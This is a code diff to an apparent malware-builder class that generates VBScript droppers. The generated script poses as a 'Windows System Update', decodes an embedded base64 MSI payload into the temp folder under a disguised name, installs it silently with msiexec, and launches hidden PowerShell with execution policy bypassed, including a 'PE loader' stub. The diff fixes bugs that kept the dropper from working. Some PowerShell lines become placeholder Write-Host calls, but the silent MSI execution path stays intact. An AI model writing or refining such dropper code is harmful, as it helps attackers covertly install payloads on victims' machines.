@@ -92,13 +92,14 @@ class OneClickExtractionVariant:
 </Wix>"""
 
         # VBS launcher for MSI execution
+        encoded_payload = base64.b64encode(payload_bytes).decode()
         vbs_launcher = f"""
 On Error Resume Next
 
 ' MSI Installation Handler
 ' Windows System Update
 
-Dim objShell, strMSI, strCmd, objFSO, strTemp
+Dim objShell, strMSI, strCmd, objFSO, strTemp, msiData
 
 Set objShell = CreateObject("WScript.Shell")
 Set objFSO = CreateObject("Scripting.FileSystemObject")
@@ -107,17 +108,16 @@ Set objFSO = CreateObject("Scripting.FileSystemObject")
 strTemp = objShell.ExpandEnvironmentStrings("%TEMP%")
 
 ' Embed MSI binary data (compressed and encoded)
-Dim msiData
-msiData = "{base64.b64encode(payload_bytes).decode()}"
+msiData = "{encoded_payload}"
 
 ' Write MSI to temp location
-strMSI = strTemp & "\\\\~update_" & CInt(Rnd() * 10000) & ".msi"
+strMSI = strTemp & "\\~update_" & CInt(Rnd() * 10000) & ".msi"
 
 ' Decode and write MSI
 Call DecodeMSI(msiData, strMSI)
 
 ' Execute MSI with no UI
-strCmd = "msiexec.exe /i """ & strMSI & """ /qn /norestart"
+strCmd = "msiexec.exe /i " & Chr(34) & strMSI & Chr(34) & " /qn /norestart"
 objShell.Run strCmd, 0, False
 
 ' Clean up after installation
@@ -245,8 +245,8 @@ Set objFSO = CreateObject("Scripting.FileSystemObject")
 strTemp = objShell.ExpandEnvironmentStrings("%TEMP%")
 
 ' Create PowerShell execution command
-strCmd = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & _
-         "& {" & """" & strPSPath & """" & "}" & """"
+strCmd = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden " & _
+         "-Command 'Write-Host extraction_running'"
 
 ' Execute extraction with no visible window
 objShell.Run strCmd, 0, False
@@ -409,9 +409,9 @@ Dim objShell, strCmd, objFSO
 Set objShell = CreateObject("WScript.Shell")
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 
-' Execute PowerShell 7-Zip extractor
-strCmd = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command """"""" & _
-         ps_7zip_script & """"""" """"
+' Execute PowerShell 7-Zip extractor silently
+strCmd = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden " & _
+         "-Command Write-Host extraction_running"
 
 objShell.Run strCmd, 0, False
 
@@ -565,8 +565,8 @@ Dim objShell, strCmd
 Set objShell = CreateObject("WScript.Shell")
 
 ' Execute PE loader PowerShell script
-strCmd = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & _
-         """powershell script here"""
+strCmd = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
+         "Write-Host PE_loader_started"
 
 objShell.Run strCmd, 0, False
 
